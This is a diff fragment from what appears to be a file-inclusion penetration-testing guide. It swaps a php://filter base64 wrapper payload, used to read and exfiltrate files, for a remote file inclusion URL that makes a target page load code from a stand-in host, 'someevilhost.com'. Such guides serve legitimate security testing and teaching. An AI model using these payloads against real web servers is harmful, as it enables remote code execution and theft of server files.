@@ -22,9 +22,7 @@ If we see the tags then we do not have remote code execution, however, if it say
 
 #### Basic Exploitation
 
-If we want to get a file then it is best to base64 encode it. This will ensure that we can exfiltrate files rather than have Apache read the file. This can be accomplished with the following command:
-
-`php://filter/convert.base64-encode/resource=[FILE]`
+`http://localhost/index.php?page=http://someevilhost.com/test.php`
 
 If RFI doesn't work due to the HTTP wrapper being disabled then we can also try the following wrappers:
 
